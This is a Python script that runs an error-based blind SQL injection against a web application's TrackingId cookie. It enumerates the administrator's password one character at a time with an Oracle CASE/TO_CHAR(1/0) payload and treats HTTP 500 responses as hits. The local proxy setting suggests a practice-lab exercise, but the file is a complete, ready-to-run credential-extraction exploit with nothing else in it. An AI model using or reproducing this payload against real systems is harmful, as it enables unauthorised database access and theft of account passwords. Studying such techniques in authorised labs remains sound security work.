
import requests
import sys
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def sqli_password(url, tracking_cookie):
    password_extracted = ""
    for i in range(1,21):
        for j in range(32,126):
            sqli_payload = f"' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and ascii(substr(password,{i},1))='{j}') || '"
            sqli_payload_encoded =  urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': tracking_cookie +sqli_payload_encoded}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if r.status_code == 500:
                password_extracted += chr(j)
                sys.stdout.write('\r'+password_extracted)
                sys.stdout.flush()
                break
                
            else:
                sys.stdout.write('\r'+password_extracted+chr(j))
                sys.stdout.flush()


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        tracking_cookie = sys.argv[2].strip()
    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} <url> <trackingid>")
        print(f"[*] Example: {sys.argv[0]} \"www.example.com\" \"sakvsksavuq21f\"")
        sys.exit(-1)

    print("Retrieving administrator password.")
    sqli_password(url,tracking_cookie)


